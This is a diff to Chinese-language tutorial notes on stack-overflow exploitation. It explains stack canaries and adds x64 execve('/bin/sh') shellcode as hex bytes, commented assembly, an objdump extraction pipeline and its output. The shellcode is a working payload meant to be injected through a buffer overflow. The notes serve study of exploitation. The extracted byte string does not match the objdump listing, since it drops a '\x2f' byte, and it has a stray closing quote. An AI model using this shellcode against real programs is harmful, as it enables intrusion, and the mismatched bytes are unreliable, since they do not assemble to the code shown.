@@ -152,9 +152,9 @@ exit(0)                                 = ?
 主要是函数返回之前，一般在调用函数的时候 返回地址会压入被调用函数的栈。一般是最后压入的。这时候如果通过栈溢出的方式就可以修改函数返回的地址。canary就是保护这个的，他一般会在返回地址的后面(高地址) 也就是先于返回地址入栈，在局部变量空间的前面(低地址处)。也就是两者之间。这样如果通过栈溢出的方式覆盖返回地址必然会覆盖canary值。局部变量溢出的时候向下必然先覆盖canary值，这样通过检查canary值是否被篡改就可以判读是否发生了栈溢出攻击。如下图。这边局部变量是在prologue  函数序言部分入栈的。这边可以参考OS/64bitos/
 
 ```
-+-------------------+
-|                   | <-- High Memory Address
-|       ...         |
++---------------------+
+|                     | <-- High Memory Address
+|       ...           |
 |                     |
 | ------------------- |
 | argn                |
@@ -356,25 +356,18 @@ gcc -z是针对运行时栈的设置。
 - \xcd\x80：int $0x80；触发中断 0x80，执行 Linux 系统调用。
 当这个 shellcode 被插入到程序的某个缓冲区，并由于缓冲区溢出而被执行时，它会尝试启动一个新的 shell。
 
-`\x48\x31\xff\x57\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x56\x48\x89\xe2\x56\xb0\x3b\x48\x89\xe6\x0f\x05`
+`\x48\x31\xd2\x52\x48\xbf\x2f\x62\x69\x6e\x73\x68\x00\x57\x48\x89\xe7\x48\x31\xf6\xb0\x3b\x0f\x05`
 
 ```assembly
-    ; 设置 rdi 为字符串 "/bin/sh" 的地址
-    xor rdi, rdi
-    push rdi
-    mov rdi, 0x68732f6e69622f2f  ; "/bin/sh" 的 ASCII 码
-    push rdi
-
-    ; 设置 rsi 和 rdx 为 NULL
-    xor rsi, rsi
-    push rsi
-    mov rdx, rsi
-    push rdx
-
-    ; 调用 execve 系统调用
-    mov al, 0x3b  ; execve 的系统调用号
-    mov rsi, rsp  ; 参数 argv 数组的地址
-    syscall
+      xor rdx, rdx           ; rdx = 0，NULL，execve 的第三个参数 envp
+    push rdx               ; 确保构造下面rdi push后的截断NULL 确保不越
+    ; 将 "/bin/sh" 字符串入栈
+    mov  rdi, 0x68732f6e69622f   ;  将 "/bin/sh" 的 ASCII 码存储到 rdi hs/nib/ 因为入栈高到低 读取低到高 然后低位在栈顶 也是低地址处。 0x68732f6e69622f
+    push rdi               ; "/bin/sh"，execve 的第一个参数 filename
+    mov rdi, rsp           ; rdi 指向字符串 "/bin/sh" 的地址，作为 execve 的 filename 参数
+    xor rsi, rsi           ; rsi = 0，NULL 参数argv
+    mov al, 0x3b          ; execve 的系统调用号为 0x3b (59)
+    syscall 
 ```
 
 
@@ -570,3 +563,53 @@ ype           Offset             VirtAddr           PhysAddr
 这里的mov esp,ebp就涉及到栈平衡的一个操作。不管中间做了什么。esp会恢复到之前的地方。但是如果没有局部变量或者编译器优化 局部变量没有初始化 相当于这边没有sub esp,xxx 那么就不会有一个mov esp,ebp的恢复操作。栈就无法恢复之前 后续会崩溃.
 
 当然x64 前6寄存器传参 就没有这个说法。这个依赖于编译器实现 程序复杂度等(可能存在代码优化或者寄存器占用等情况 ebp无法使用 那么就得一步步加减还原esp)
+
+
+
+下面是一个提取机器码的脚本
+
+```sh
+objdump -d ./shellcode64.out | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s | sed 's/^/"/'|sed 's/$/"/g'
+```
+
+```
+objdump -d ./shellcode64.out：使用objdump工具以反汇编的形式查看./shellcode64.out文件。
+grep '[0-9a-f]:'：通过grep查找包含'[0-9a-f]:'的行，也就是找出所有的二进制代码行。
+grep -v 'file'：grep -v用来反向选择，这里是去掉包含file的行。
+cut -f2 -d:：这是一个剪切命令，用冒号:`作为分隔符，取出第二个字段。
+cut -f1-6 -d' '：这个命令表示，以空格作为分隔符，取出前6个字段。
+tr -s ' '和tr '\t' ' '：将多余的空格和制表符均转换为一个空格。
+sed 's/ $//g'：使用sed工具删除每行末尾留下的空格。
+sed 's/ /\\x/g'：将空格替换为字符串\x。
+paste -d '' -s：将所有行合并成一行。
+sed 's/^/"/'和sed 's/$/"/g'：在整个字符串的开头和结尾分别加上一个双引号。
+```
+
+
+下面是objdump的结果
+
+```
+shellcode64.out:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000401000 <_start>:
+  401000:       48 31 d2                xor    %rdx,%rdx
+  401003:       52                      push   %rdx
+  401004:       48 bf 2f 62 69 6e 2f    movabs $0x68732f6e69622f,%rdi
+  40100b:       73 68 00 
+  40100e:       57                      push   %rdi
+  40100f:       48 89 e7                mov    %rsp,%rdi
+  401012:       48 31 f6                xor    %rsi,%rsi
+  401015:       b0 3b                   mov    $0x3b,%al
+  401017:       0f 05                   syscall 
+```
+
+提取输出内容：
+
+
+```
+\x48\x31\xd2\x52\x48\xbf\x2f\x62\x69\x6e\x73\x68\x00\x57\x48\x89\xe7\x48\x31\xf6\xb0\x3b\x0f\x05"
+```
+
